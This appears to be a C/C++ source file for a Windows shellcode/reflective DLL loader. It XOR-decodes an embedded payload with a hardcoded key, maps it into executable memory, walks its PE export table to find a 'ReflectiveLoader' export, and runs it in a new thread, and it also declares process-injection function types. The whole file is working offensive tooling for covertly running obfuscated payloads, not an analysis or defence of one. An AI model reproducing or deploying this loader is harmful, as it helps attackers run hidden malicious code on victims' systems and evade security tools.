#include "freedent.h"

#include "callFree.h"

#include <string.h>
#include <windows.h>
#pragma comment(lib, "user32.lib")

typedef int(WINAPI* MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
typedef void(WINAPI* OutputDebug_t)(LPCSTR);

typedef BOOL(WINAPI* DllMain_t)(HINSTANCE, DWORD, LPVOID);

typedef BOOL(WINAPI* REFLECTIVE_LOADER)(void);

typedef void(WINAPI* Sleep_t)(DWORD);
// typedef MessageBoxA_t(WINAPI* REFLECTIVE_LOADER)(void);

typedef LPVOID(WINAPI* VirtualAlloc_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize,
                                       DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer,
                                           SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);

typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE hProcess,
                                             LPSECURITY_ATTRIBUTES lpThreadAttributes,
                                             SIZE_T dwStackSize,
                                             LPTHREAD_START_ROUTINE lpStartAddress,
                                             LPVOID lpParameter, DWORD dwCreationFlags,
                                             LPDWORD lpThreadId);

void rox(char* d, size_t d_len, char* k, size_t k_len) {
        int j;

        j = 0;
        for (int i = 0; i < d_len; i++) {
                if (j == k_len - 1)
                        j = 0;

                d[i] = d[i] ^ k[j];
                j++;
        }
}

BYTE* RVA_to_Offset(BYTE* baseAddr, DWORD rva) {
        // Get DOS Header ptr
        IMAGE_DOS_HEADER* dosH = (IMAGE_DOS_HEADER*)baseAddr;

        // Get PE Header alias NT Header offset via e_lfanew
        // LONG ntOff = dosH->e_lfanew;
        if (dosH->e_magic != IMAGE_DOS_SIGNATURE) {
                printf("Not the DOS Header\n");
        }
        IMAGE_NT_HEADERS64* ntH = (IMAGE_NT_HEADERS64*)(baseAddr + dosH->e_lfanew);
        // printf("NT Header Addr: %p\n", ntH);
        // printf("NT Header Magic Bytes: 0x%04x\n", ntH->Signature);

        // Get Optional Header
        IMAGE_OPTIONAL_HEADER64* opH = &ntH->OptionalHeader;
        // printf("Optional Header Addr: %p\n", opH);
        // printf("Optional Header Magic Bytes: 0x%04x\n", opH->Magic);

        // Get Image Data Dir
        // DataDirectory[0] points to Export Dir
        IMAGE_DATA_DIRECTORY* exportDataDir = &opH->DataDirectory[0];

        size_t k{};
        BYTE* name{};
        BYTE* offset{};
        //
        // IMPORTANT
        // The Data Directories are embedded in the Optional Header
        // So when we get a pointer to the end of the Optional Header, we can get the sections
        // headers
        IMAGE_SECTION_HEADER* sectionH =
            (IMAGE_SECTION_HEADER*)((BYTE*)&ntH->OptionalHeader +
                                    ntH->FileHeader.SizeOfOptionalHeader);
        // Need to check wether the section.VirtualAddress <= RVA < section.VirtualAddress +
        // section.VirtualSize This will be the section where the bytes we want are
        for (size_t i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
                if (rva >= sectionH->VirtualAddress &&
                    rva < (sectionH->VirtualAddress + sectionH->SizeOfRawData)) {
                        // sectionH->VirtualAddress is the RVA of the section, so rva -
                        // sectionH->VirtualAddress returns the offset of the rva in the section
                        // header sectionH->PointerToRawData are where the bytes are in the disk, so
                        // sectionH->PointerToRawData + (rva - sectionH->VirtualAddress) returns the
                        // actual offset on the disk of the target RVA
                        offset =
                            (BYTE*)((rva - sectionH->VirtualAddress) + sectionH->PointerToRawData);
                        // printf("Section Name: %s\n", name);
                        // printf("Offset: %p\n", offset);
                        return offset;
                }
                sectionH++;
        }
        printf("No offset found\n");
        return offset;
}

// DWORD GetFunctionDll(void * ptr, char* lpProcName) {
BYTE* getFunctionDll(void* ptr, char* lpProcName) {
        IMAGE_SECTION_HEADER* section{};
        // DWORD functionAddr{};
        BYTE* functionAddr{};
        DWORD functionIndex = 0;
        DWORD* functionRVA{};

        // Step 1
        // Base Addr
        BYTE* baseAddr = (BYTE*)ptr;
        // printf("%-20s : 0x%-016p\n", "payload addr", (BYTE*)baseAddr);

        // Step 2
        // Get DOS Header ptr
        IMAGE_DOS_HEADER* dosH = (IMAGE_DOS_HEADER*)baseAddr;

        // Step 3
        // Get PE Header alias NT Header offset via e_lfanew
        // LONG ntOff = dosH->e_lfanew;
        if (dosH->e_magic != IMAGE_DOS_SIGNATURE) {
                printf("Not the DOS Header\n");
        }
        // printf("Our Magic Byte : 0x%04x\n", dosH->e_magic);
        // printf("Magic Byte Expected : 0x%04x\n", IMAGE_DOS_SIGNATURE);
        IMAGE_NT_HEADERS64* ntH = (IMAGE_NT_HEADERS64*)(baseAddr + dosH->e_lfanew);
        // printf("NT Header Addr: %p\n", ntH);
        // printf("NT Header Magic Bytes: 0x%04x\n", ntH->Signature);

        // Step 4
        // Get Optional Header
        IMAGE_OPTIONAL_HEADER64* opH = &ntH->OptionalHeader;
        // printf("Optional Header Addr: %p\n", opH);
        // printf("Optional Header Magic Bytes: 0x%04x\n", opH->Magic);
        // printf("Magic Bytes Expected: 0x%04x\n", IMAGE_NT_OPTIONAL_HDR_MAGIC);

        // Get Image Data Dir
        // DataDirectory[0] points to Export Dir
        IMAGE_DATA_DIRECTORY* exportDataDir = &opH->DataDirectory[0];

        IMAGE_EXPORT_DIRECTORY* exportDir =
            (IMAGE_EXPORT_DIRECTORY*)(baseAddr +
                                      (size_t)RVA_to_Offset((BYTE*)baseAddr,
                                                            exportDataDir->VirtualAddress));
        // printf("Export Dir Addr: %p\n", exportDir);

        // Get functions names from AddressOfNames
        // AddressOfNames returns an RVA to an array of DWORD value that are each RVAs
        // to DWORDS
        DWORD* functionsNames =
            (DWORD*)(baseAddr + (size_t)RVA_to_Offset((BYTE*)baseAddr, exportDir->AddressOfNames));
        // printf("Functions Names Addr: %p\n", functionsNames);

        // printf("Hit Enter!");
        // getchar();

        // Get the function address from AddressOfFunctions
        // AddressOfFunctions returns an RVA to an array of DWORD value that are each
        // DWORD* functionsNames = (DWORD*)(baseAddr + (exportDir->AddressOfNames -
        // sectionH->VirtualAddress) + sectionH->PointerToRawData;
        DWORD* functionsAddrs =
            (DWORD*)(baseAddr +
                     (size_t)RVA_to_Offset((BYTE*)baseAddr, exportDir->AddressOfFunctions));

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
                // printf("Nbr Names: %p\n", exportDir->NumberOfNames);
                char* functionName =
                    (char*)(baseAddr + (size_t)RVA_to_Offset((BYTE*)baseAddr, functionsNames[i]));

                // functionsNames[i] returns an RVA to a DWORD
                if (strcmp(lpProcName, functionName) == 0) {
                        // printf("Function Name: %s\n", functionName);

                        // Get the index of the function ordinal
                        functionIndex = i;
                        break;
                }
        }

        // Get the function ordinal from AddressOfNamesOrdinals
        // AddressOfNamesOrdinals returns an RVA to an array of WORD
        WORD* functionsOrdinals =
            (WORD*)(baseAddr +
                    (size_t)RVA_to_Offset((BYTE*)baseAddr, exportDir->AddressOfNameOrdinals));
        WORD functionOrdinal = functionsOrdinals[functionIndex];
        // printf("Function Ordinal: %p\n", functionOrdinal);

        // printf("Function Ordinal: %#010x\n", functionOrdinal);
        // printf("Functions Addresses: %#010x\n", functionsAddrs);
        // printf("Functions Addresses RVA: %#010x\n",
        // exportDir->AddressOfFunctions);

        // printf("Function Addrs Ordinal: %p\n", functionsAddrs[functionOrdinal]);
        // BYTE cast to get the raw ptr to the function, maybe useless
        // Need to return the File Offset of the function, not the baseAddr + Offset
        functionAddr = RVA_to_Offset((BYTE*)baseAddr, functionsAddrs[functionOrdinal]);
        // printf("Function RVA: %p\n", functionAddr);
        return functionAddr;
}

// int main(void) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        void* exec_mem;
        BOOL rv;
        HANDLE th;
        DWORD oldprotect = 0;
        DWORD threadID{};

        // DeXOR our payload
        // Multibytes key
        char key[] = "EiichiroOda";
        rox((char*)payload, payload_len, key, sizeof(key));

        exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        // printf("%-20s : 0x%-016p\n", "payload addr", (void*)payload);
        // printf("%-20s : 0x%-016p\n", "buffer addr", (void*)exec_mem);

        RtlMoveMemory(exec_mem, payload, payload_len);

        rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

        BYTE* loaderOffset = getFunctionDll((void*)exec_mem, "ReflectiveLoader");

        REFLECTIVE_LOADER loader =
            (REFLECTIVE_LOADER)(exec_mem + (size_t)loaderOffset); // addr is pointer to function
                                                                  // obtained from parsing exports
        // if (loader) {
        //         // printf("Loader Executed: %p\n", loader());
        //         printf("Loader Executed: %d\n", loader());
        //         // printf("Loader Executed: %s\n", loader());
        // }

        // printf("%-20s : 0x%-016p\n", "ReflectiveLoader Function Addr", loaderOffset);
        // printf("Buffer + function Addr: %p\n", exec_mem + (size_t)loaderOffset);
        // printf("Hit Enter!");
        // getchar();

        if (rv != 0) {
                th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(exec_mem + (size_t)loaderOffset),
                                  0, 0, 0);
                Sleep(5000);
                WaitForSingleObject(th, -1);
        }
        return 0;
}
